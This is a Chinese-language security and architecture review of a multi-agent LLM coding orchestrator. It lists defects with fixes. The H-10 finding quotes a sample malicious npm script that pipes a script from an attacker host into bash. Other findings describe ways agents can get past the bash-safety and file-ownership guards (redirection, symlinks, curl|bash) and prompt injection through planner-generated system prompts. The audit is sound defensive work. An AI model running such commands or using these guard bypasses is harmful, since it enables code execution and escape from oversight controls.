# Agent-Team 架构审查报告

> 最近更新: 2026-05-31
>
> 审查方法: 三维度并行审查 (正确性/安全性/一致性) + 对抗验证 + 去重合成。
> 原始发现 43 个 → 对抗验证确认 26 个 → 去重后 21 个唯一缺陷。

## 1. 项目概览

### 1.1 项目目的

`packages/agent-team` 是一个多 Agent 团队编排系统，用于全栈开发自动化。它接收一个自然语言需求描述，通过 LLM 动态规划团队角色和任务，并行调度多个 Agent 执行开发工作，自动验证产出质量，并在发现问题时驱动修复循环。

### 1.2 整体架构

```
CLI (main.ts)
  |
  v
Config Discovery & Merge (config.ts)
  |
  v
DynamicTeamRun (team-runner.ts)
  |
  +-- Model Resolution (team-runner.ts:62-108)
  +-- API Key Registration (team-runner.ts:177-179)
  |
  v
TeamLead (team-lead.ts)
  |
  +-- Planner (planner.ts) --> LLM --> TeamPlan (roles, tasks, contracts)
  |     |
  |     v
  |   Contract Files (team-plan.json, project-manifest.json, openapi.json, ...)
  |
  +-- Role Registry (role-registry.ts) --> Map<name, RoleDefinition>
  |
  +-- Task DAG (task-graph.ts) + TaskScheduler (task-scheduler.ts)
  |     |
  |     v
  |   runTasks() --> for each batch:
  |     |
  |     +-- runTeamAgent (team-agent.ts) per task
  |     |     |
  |     |     +-- Tool Pool (tool-pool.ts): read, write, edit, bash, grep, find, ls
  |     |     +-- Ownership Guard (file-ownership.ts)
  |     |     +-- Bash Safety Guard (bash-safety.ts)
  |     |     +-- Context Transform (contract-aware window)
  |     |     +-- Agent Core (@mariozechner/pi-agent-core)
  |     |
  |     v
  |   Promise.allSettled(batch)
  |
  +-- Validator (validator.ts)
  |     |
  |     +-- Static Checks (file existence, package.json, OpenAPI paths)
  |     +-- Runtime Checks (node --check, npm install, npm run check/test/build)
  |
  +-- Repair Loop (maxRepairRounds, default 2)
  |     |
  |     v
  |   createRepairTasks (planner.ts:368-396) --> re-enter runTasks
  |
  v
TeamResult (success/failure + all task results)
```

### 1.3 包依赖关系

```
agent-team --> @mariozechner/pi-agent-core (Agent 运行时、工具调用)
           --> @mariozechner/pi-coding-agent (工具工厂、消息转换、模型注册表)
           --> @mariozechner/pi-tui (终端 UI)
           --> @mariozechner/pi-ai (LLM 流式 API)
```

---

## 2. 执行流程

### 2.1 CLI 启动与参数解析

**文件:** `packages/agent-team/src/main.ts`, `parseArgs` (line 40)

`parseArgs` 接收 `process.argv.slice(2)`，通过手动 `for` 循环解析以下标志：

| 标志 | 目标字段 |
|---|---|
| `--requirement <text>` | `result.requirement` |
| `--output <path>` | `result.outputDir` |
| `--model <id>` | `result.model.model` |
| `--provider <name>` | `result.model.provider` |
| `--api-key <key>` | `result.model.apiKey` |
| `--base-url <url>` | `result.model.baseUrl` |
| `--config <path>` | `result.configPath` |
| `--max-parallel <n>` | `result.options.maxParallelAgents` (parseInt) |
| `--thinking-level <lvl>` | `result.options.thinkingLevel` |
| `--max-repair-rounds <n>` | `result.options.maxRepairRounds` (parseInt) |
| `--intervention-mode <mode>` | `result.options.interventionMode` |
| `--interactive` | `result.interactive = true` |

解析后，`main()` 验证 `--requirement` 和 `--output` 必须存在，缺失则退出码 1。

### 2.2 配置文件发现与合并

**文件:** `packages/agent-team/src/config.ts`

**发现顺序** (`findConfigFile`, line 38)：

1. 显式路径 (`--config <path>`)：若提供则直接使用，缺失或无效时打印警告继续执行
2. 当前工作目录：`resolve("agent-team.json")`
3. 用户主目录：`join(homedir(), ".pi", "agent-team.json")`

第一个成功找到并解析的文件生效，无多层叠加。

**合并优先级** (`mergeConfig`, line 62)：

```
CLI > 文件配置 > 硬编码默认值
```

逐字段通过 nullish coalescing (`??`) 合并。唯一硬编码默认值为模型 ID `"claude-sonnet-4-6"`。

### 2.3 模型解析与 API Key 管理

**文件:** `packages/agent-team/src/team/team-runner.ts`, `DynamicTeamRun.start()` (line 170)

解析管线：

1. **API Key 注册** (lines 177-179)：若 `config.model.apiKey` 和 `config.model.provider` 均设置，调用 `authStorage.setRuntimeApiKey(provider, apiKey)`
2. **注册表创建** (line 180)：`ModelRegistry.create(authStorage)` 构建所有已知提供者的模型注册表
3. **模型解析** (lines 181-186)：调用 `resolveModel(registry, provider, modelId, baseUrl)`
   - 若 provider 未定义且 modelId 含 `/`，拆分提取 provider 和 model ID
   - 精确匹配查找：`registry.find(resolvedProvider, resolvedModelId)`
   - Provider 模板回退：使用该 provider 的第一个模型作为模板
   - 无 provider 搜索：遍历所有 provider 的所有模型
   - 失败：抛出错误
4. **跨 provider Key 传播** (lines 189-191)：若解析后的 model.provider 与配置的 provider 不同，为解析后的 provider 也注册 API key
5. **getApiKey 回调** (lines 193-201)：传给 TeamLead，优先返回配置的 key

### 2.4 TeamLead 编排

**文件:** `packages/agent-team/src/team/team-lead.ts`, `orchestrate()` (lines 125-242)

1. emit `run_start`
2. 规划阶段：调用 `llmPlannerRunner`，生成角色、任务、合约文件
3. 构建角色注册表：`createRoleRegistry(plan)`
4. 进入任务/修复循环：
   - `runTasks(tasksToRun, plan, roleRegistry)`
   - `validateTeamOutputWithChecks` 运行验证
   - 无 error：成功返回
   - 有 error 且超修复上限：失败返回
   - 否则：创建修复任务，继续循环

### 2.5 完整事件发射顺序

```
run_start
  plan_created
    [for each batch]:
      task_start (per task)
      task_progress (on tool block)
      agent_event (low-level forwarding)
      task_end (per task)
    validation_start
    validation_end
  [if repair needed]:
    repair_requested
    plan_updated
    [loop back to task batch]
run_end (always final)
```

---

## 3. 工具与 Skill 加载

### 3.1 工具池构建

**文件:** `packages/agent-team/src/agent/tool-pool.ts`

7 个工具，全部来自 `@mariozechner/pi-coding-agent`：

| 工具名 | 工厂函数 |
|--------|---------|
| `read` | `createReadTool(cwd)` |
| `write` | `createWriteTool(cwd)` |
| `edit` | `createEditTool(cwd)` |
| `bash` | `createBashTool(cwd)` |
| `grep` | `createGrepTool(cwd)` |
| `find` | `createFindTool(cwd)` |
| `ls` | `createLsTool(cwd)` |

`buildToolPool(role, outputDir)` 读取 `role.allowedTools`，仅实例化允许集合中的工具。每个工具以 `outputDir` 为 `cwd`。

### 3.2 beforeToolCall 钩子链

**执行顺序：Ownership Guard -> Bash Safety Guard**（链式短路）

**文件归属守卫** (`file-ownership.ts`)：检查 `write`/`edit` 的路径是否在 `role.ownedDirectories` 内

**Bash 安全守卫** (`bash-safety.ts`)：检查 bash 命令是否匹配危险模式，`mkdir` 有专门安全通道

### 3.3 API Key 管理策略

三层回退：
1. **配置的 `config.model.apiKey`**：getApiKey 回调优先返回
2. **`authStorage.setRuntimeApiKey()`**：在 start() 中注册
3. **环境变量**：`modelRegistry.getApiKeyForProvider()` 最终回退

---

## 4. Agent 协作机制

### 4.1 动态角色分配

**文件:** `packages/agent-team/src/team/planner.ts`

角色分配完全由 LLM 动态决定。LLM 输出 JSON 包含 roles[]、tasks[]、contracts。`validatePlannerJson()` 执行角色规范化、依赖引用完整性检查、循环依赖检测（`validateAcyclicTasks`）。

### 4.2 任务依赖图和并行调度

**TaskGraph** (`task-graph.ts`)：DAG 存储，`getReadyTasks()` 返回就绪任务，`propagateFailure()` BFS 级联传播失败。

**TaskScheduler** (`task-scheduler.ts`)：包装 TaskGraph，强制执行并发上限（默认 2）。

**runTasks()** 调度循环：每次拉取一批不超过 `maxParallelAgents` 的就绪任务，`Promise.allSettled` 并行运行。

### 4.3 修复循环

每次验证后若有 error 级别问题：`createRepairTasks` 按 owner 分组，克隆原任务 + 验证问题列表，默认最多 2 轮修复。

### 4.4 运行时验证

**Phase 1 -- 静态检查**：文件存在、package.json、OpenAPI 路径覆盖
**Phase 2 -- 运行时检查**：`node --check` 语法检查、`npm install`、`npm run check/test/build`，首个失败中断

---

## 5. 缺陷与问题

### 5.1 CRITICAL

**[C-1] 并行任务失败归因错误**
- 文件: `team-lead.ts:303-308`
- `Promise.allSettled` 有 rejected 结果时，`find(in_progress)` 可能匹配到错误任务。真正失败的任务留在 in_progress，scheduler 永远不完成。
- **修复**: 维护 taskId -> promise 映射，通过数组索引定位实际失败任务。

**~~[C-2] 规划器无循环依赖检测~~ — 已解决**
- `validatePlannerJson` 现已包含 `validateAcyclicTasks()` (planner.ts:137-163)，使用标准 DFS 环检测，并在检测到循环时抛出包含循环路径的错误。`planner.test.ts` 也有对应测试验证。

### 5.2 HIGH

**[H-1] 中止原因误归因** — `team-agent.ts:179` — parentSignal.aborted 和 maxTurns 同时为真时掩盖真实原因

**[H-2] "provider/model" 格式的 API Key 注册被跳过** — `config.ts` + `team-runner.ts` — provider 为 undefined 时初始注册是死代码

**[H-3] 验证器硬编码 task-api/api-builder 角色** — `validator.ts:393-398` — 动态计划中可能无此任务，修复任务路由到错误 Agent

**[H-4] Bash 安全模式缺口** — `rm`（无 -rf）、`curl|bash`、`npx`、`chmod`、反引号命令替换等可通过

**[H-5] 文件归属守卫不覆盖 bash 工具** — Agent 可通过 `echo > ../other-dir/file.txt` 绕过归属限制

**[H-6] team-runner.ts 和 team-agent.ts 无测试覆盖** — 系统主入口和核心 Agent 构造器未测

**[H-7] runTasks 缺乏进度可见性** — 正常工具调用不产生进度事件

**[H-8] 默认模型硬编码 "claude-sonnet-4-6"** — 模型退役后需更新所有配置

**[H-9] 缺少 README.md** — 无使用文档或 API 参考

**[H-10] Validator 执行 LLM 生成的 npm scripts 导致任意代码执行** — `validator.ts:291-344`
- 验证器从 LLM 生成的 package.json 读取 scripts 并通过 spawn 执行。只有脚本名称是硬编码的（check/test/build），但脚本内容完全由 LLM agent 控制。`scriptExists()` 仅检查 key 存在且非空——不做任何内容清洗。
- 在 Windows 上，`npmCommandSpec` 使用 `shell: true`（line 146-148），通过 cmd.exe 执行，支持管道、命令链、命令替换。
- `bash-safety.ts` 的安全守卫仅适用于 worker agent 的工具调用，**不适用于**验证器的 spawn 调用。
- **影响**: LLM agent 可在 package.json 中注入恶意脚本（如 `"check": "curl attacker.com/shell.sh | bash"`），验证器会原样执行。
- **修复**: 在执行 npm scripts 前校验脚本内容仅包含已知安全命令模式（如 vitest、tsc、eslint、biome、node），或在沙盒环境中执行。

### 5.3 MEDIUM

**[M-1]** 合约感知上下文变换在边界处丢弃历史合约消息 — `team-agent.ts:75`

**[M-2]** finishTask 对 rejected promise 处理不当 — `team-lead.ts:302`

**[M-3]** getApiKey 回调使 authStorage 注册成为死代码 — `team-runner.ts:188-201`
- 当 `projectConfig.model.apiKey` 存在时，回调短路返回该 key，忽略 `provider` 参数。对所有 provider 返回同一个 key。当前所有 agent 共用一个模型时不触发，但 `RoleDefinition.modelOverride` 存在后会暴露。
- **修复**: 仅对匹配的 provider 返回配置的 key，其余走 modelRegistry 回退。

**[M-4]** OpenAPI 路径匹配第三种模式（段拼接）产生误报 — `validator.ts:123-140`

**[M-5]** ownerForFile 使用 first-match 语义，忽略更具体的归属目录 — `validator.ts:228-237`

**[M-6]** runCommand 无 SIGKILL 升级和进程树清理 — `validator.ts:158-210`

**[M-7]** 无 ownerTaskId 的验证问题路由到 plan.tasks[0] — `planner.ts:400`
- `createRepairTasks` 对既无 `ownerTaskId` 也无 `ownerRole` 的问题回退到 `plan.tasks[0]?.id`。`invalid-package-json` 类型的 issue 确实会触发此路径。可能将修复任务分配给无相关能力的 agent。
- **修复**: 通过 issue 的 file 字段匹配 task 的 ownedDirectories 查找最合适的 owner。

**[M-8]** validator.ts timeout 和 abort 处理器竞争条件 — `validator.ts:192-193`

**[M-9]** validationRules 字段从未被消费 — 纯装饰性字段
- Planner 的 system prompt 要求 LLM 生成 validation rules，`team-plan.json` 中也持久化了这些规则，但 validator.ts 从未读取 `plan.validationRules`。所有验证逻辑是硬编码的。浪费 LLM token 并误导用户。

**[M-10]** 缺少 task_retry 事件和持续时间指标

**[M-11]** 上下文窗口大小和默认 maxTurns 不可配置

**[M-12]** RuntimeValidationOptions 不可从 TeamConfig 配置

**[M-13]** parseInt 无 NaN 验证导致静默错误行为 — `main.ts:67,74`
- `parseInt("abc", 10)` 返回 NaN，NaN 通过 `??` 不回退默认值（NaN 不是 nullish）。`--max-repair-rounds abc` 导致 `round >= NaN` 恒为 false，修复循环永不终止。`--max-parallel abc` 导致 `ready.slice(0, NaN)` 返回空数组，零任务执行。
- **修复**: parseInt 后检查 `Number.isNaN()`，无效时报错退出。

**[M-14]** 验证器静态检查提前返回阻止运行时检查发现更多问题 — `validator.ts:445`
- 静态检查发现 error 后立即返回，不运行语法检查和 npm scripts。若项目同时存在缺失文件和语法错误，首轮修复只修文件，下轮才发现语法错误，浪费修复轮次。
- **修复**: 对已存在的文件仍运行运行时检查，合并返回静态和运行时问题。

**[M-15]** LLM 生成的 planner JSON 允许任意 systemPrompt 注入 — `planner.ts:111`
- `normalizeRole` 接受 LLM 输出中的 systemPrompt 字段，仅验证非空字符串，直接用作 agent 系统消息。用户需求文本未经转义拼接到 Planner LLM prompt（line 355），可间接 prompt injection。
- **缓解**: bash-safety、file-ownership、allowedTools、maxTurns 提供多层防护，但 systemPrompt 注入可指导 agent 尝试绕过。
- **修复**: 对 systemPrompt 做内容过滤或使用模板系统；转义用户需求文本。

**[M-16]** LLM 生成的 ownedDirectories 允许 "." 授予全项目写权限 — `planner.ts:129`
- `validateSafePaths` 阻止绝对路径和 `..`，但允许 `.`。当 LLM 输出 `ownedDirectories: ["."]` 时，该 agent 获得整个 outputDir 的写权限，破坏多 agent 隔离模型。
- **修复**: 拒绝 `.` 作为 ownedDirectory，要求至少一个非平凡路径段。

### 5.4 LOW

**[L-1]** ~~parseInt 无 NaN 验证~~ — 已升级至 [M-13]

**[L-2]** extractFilesCreated 包含被阻止的工具调用路径
- `extractFilesCreated` 扫描所有 assistant 消息中的 write/edit 工具调用，但不检查调用是否被 beforeToolCall 阻止。`filesCreated` 是纯信息字段，不被任何决策逻辑消费。

**[L-3]** TUI 仅追踪最新审批请求

**[L-4]** 安全目录创建检查遗漏反引号

**[L-5]** isWithin 对符号链接路径不匹配
- `isWithin` 使用 `path.relative()` 做词法路径比较，不调用 `fs.realpathSync`。Agent 可通过在 owned directory 内创建指向外部的符号链接来绕过归属检查。实际风险低：项目运行在 Windows（符号链接需管理员权限），agent 是协作性的 LLM agent。

**[L-6]** extractJsonText 对多个顶层 JSON 对象脆弱

**[L-7]** modelOverride 和 thinkingLevelOverride 是死代码
- `RoleDefinition` 声明了 `modelOverride` 和 `thinkingLevelOverride` 可选字段，但 `roleFromSpec()` 从不设置、`runTasks()` 从不读取。planner 不会从 LLM 输出中解析这些字段。

**[L-8]** propagateFailure 性能为 O(N*E)，无反向邻接表

**[L-9]** readProjectText 内存效率低

**[L-10]** TUI 渲染窗口表达式含死代码 `Math.max(3, 20)` — 恒为 20，应直接写 `slice(-20)`

**[L-11]** logger ROLE_COLORS 仅覆盖 5 个固定角色名 — 动态角色全部显示白色

**[L-12]** ~~静态检查提前返回阻止运行时检查~~ — 已升级至 [M-14]

**[L-13]** getReadyTasks 对不存在于图中的依赖 ID 静默跳过 — `task-graph.ts:32`
- 当任务依赖一个不存在的 ID 时，`dep?.status !== 'completed'` 为 `true`，任务永远不就绪。planner 验证阻止了正常流程到达此处，但 TaskGraph 本身缺乏防御性检查。

**[L-14]** BashSafetyOptions 和 BashApprovalRequest 未从 index.ts 重新导出
- 外部消费者无法通过公共 API 导入这些类型。TypeScript 结构化类型允许传递字面量对象，所以实际使用不受影响。

**[L-15]** ContractKind 类型仅在同文件内使用 — `types.ts:23`
- 未从 index.ts 重新导出，外部消费者无法引用。

**[L-16]** getSystemPrompt 硬编码非动态角色配置 — `system-prompts.ts:20`
- `getSystemPrompt()` 使用固定 ownedDirectories 和 maxTurns，与动态 planner 系统冲突。该函数在整个 src/ 和 test/ 中无调用者，是旧固定角色系统的遗留物。

**[L-17]** createRoleRegistry 导出两次（不同名称）— `index.ts:11,17`
- 同一函数通过 `createRoleRegistry`（via role-registry.ts 桶文件）和 `createPlanRoleRegistry`（via planner.ts 直接导入）两个名称导出。

**[L-18]** approval_requested 事件的 command 字段类型为 optional，但实际总是提供 — `types.ts:176`
- `command?: string` 声明为可选，但 `team-runner.ts:234` 方法签名为 `command: string`（必需），所有调用者都提供值。

**[L-19]** 配置文件从当前工作目录加载可被利用 — `config.ts:48`
- `findConfigFile` 从 `process.cwd()` 搜索 `agent-team.json`。若用户在不受信目录运行 agent-team，恶意配置的 `baseUrl` 可将 API 调用重定向到攻击者服务器。风险低：运行工具的目录通常由用户自行选择。

---

## 6. 测试覆盖

### 6.1 已覆盖模块（7 个测试文件）

| 测试文件 | 被测模块 | 覆盖范围 |
|----------|---------|---------|
| `task-graph.test.ts` | `task-graph.ts` | 添加/检索、重复 ID、就绪任务、依赖阻塞、完成/失败追踪、propagateFailure |
| `task-scheduler.test.ts` | `task-scheduler.ts` | maxParallel 槽位、依赖遵守、完成/失败检测 |
| `bash-safety.test.ts` | `bash-safety.ts` | 允许只读/阻止破坏性命令 |
| `file-ownership.test.ts` | `file-ownership.ts` | 归属目录内外路径、精确匹配、嵌套路径 |
| `planner.test.ts` | `planner.ts` | 合约写入、依赖图、畸形 JSON 修复、循环依赖检测 |
| `team-lead.test.ts` | `team-lead.ts` | 完整编排事件序列、规划失败处理 |
| `validator.test.ts` | `validator.ts` | 缺失输出、OpenAPI 路径、运行时检查 |

### 6.2 未覆盖模块

| 模块 | 风险 |
|------|------|
| `team-runner.ts` | **高** — 系统主入口，模型解析、暂停/恢复、审批流未测 |
| `team-agent.ts` | **高** — Agent 构造器，轮次强制、上下文压缩未测 |
| `tool-pool.ts` | **中** — 工具池是每个 Agent 的单点故障 |
| `config.ts` | **中** — 配置加载和合并逻辑 |
| `system-prompts.ts` | **中** — 系统提示模板 |
| `logger.ts` | **低** |
| `team-tui.ts` | **低** |

---

## 7. 改进建议

### 7.1 短期（必须修复）

| ID | 问题 | 修复方案 |
|----|------|---------|
| S-1 | 并行任务失败归因错误 [C-1] | 维护 taskId->promise 映射，通过数组索引定位失败任务 |
| ~~S-2~~ | ~~无循环依赖检测 [C-2]~~ | ~~validatePlannerJson 添加 DFS 环检测~~ **已解决** |
| S-3 | 中止原因误归因 [H-1] | parentSignal.aborted 检查提前于 maxTurns |
| S-4 | provider/model API Key 注册 [H-2] | 先 resolveModel 再用解析后的 provider 注册 key |
| S-5 | 硬编码 task-api/api-builder [H-3] | 通过 plan.tasks 动态查找拥有对应文件的任务 |
| S-6 | npm scripts 任意代码执行 [H-10] | 执行前校验脚本内容仅含已知安全命令 |
| S-7 | parseInt NaN 导致无限循环 [M-13] | 解析后检查 Number.isNaN()，无效时报错退出 |

### 7.2 中期（架构优化）

| ID | 问题 | 修复方案 |
|----|------|---------|
| M-1 | Bash 安全缺口 [H-4] | 添加 rm（无标志）、curl\|bash、npx、chmod 等模式，加反引号检测 |
| M-2 | bash 绕过归属限制 [H-5] | 对 bash 工具做简单路径提取检查（>、cp、mv 目标） |
| M-3 | 核心模块无测试 [H-6] | 用 mock Agent/streamFn 测试 team-runner 和 team-agent |
| M-4 | 可观测性差 [H-7] | task_end 加 durationMs，加 task_retry 事件，Agent 工具调用事件 |
| M-5 | 硬编码默认值 [H-8] | 提取为命名常量，TeamConfig.advanced 允许覆盖 |
| M-6 | 运行时验证不可配 [M-12] | TeamConfig 增加 validationOptions 字段 |
| M-7 | 上下文变换边界 [M-1] | 边界情况保留至少 1 条中间消息 |
| M-8 | 验证规则不可扩展 [M-9] | 定义 ValidationRule 接口，支持注册自定义规则 |
| M-9 | 静态检查提前返回浪费修复轮次 [M-14] | 对已存在文件仍运行运行时检查，合并问题列表 |
| M-10 | systemPrompt 注入 [M-15] | 对 systemPrompt 做内容过滤；转义用户需求文本 |
| M-11 | ownedDirectories "." 破坏隔离 [M-16] | validateSafePaths 拒绝 "." 路径 |

### 7.3 长期（功能增强）

- **插件/扩展机制**：工具注册 API、验证规则注册 API、系统提示片段注入
- **完整文档**：README.md、JSDoc、架构说明
- **性能优化**：propagateFailure 改用反向邻接表、readProjectText 改逐文件搜索
- **逐角色模型定制**：接线 RoleDefinition.modelOverride [L-7]
- **TUI 体验优化**：多审批队列、实时进度、动态角色颜色 [L-11]
- **错误类型结构化**：ModelResolutionError、PlannerError、ValidationError 等专用错误类
- **公共 API 清理**：移除 getSystemPrompt 遗留导出 [L-16]、去重 createRoleRegistry 双重导出 [L-17]、补齐遗漏的类型导出 [L-14, L-15]

---

## 8. 缺陷统计

| 严重度 | 数量 | 状态 |
|--------|------|------|
| CRITICAL | 1 (C-1) | 未解决 |
| ~~CRITICAL~~ | ~~1 (C-2)~~ | ~~已解决~~ |
| HIGH | 10 | 未解决 |
| MEDIUM | 16 | 未解决 |
| LOW | 19 | 未解决 |
| **总计** | **45 (2 已解决)** | |
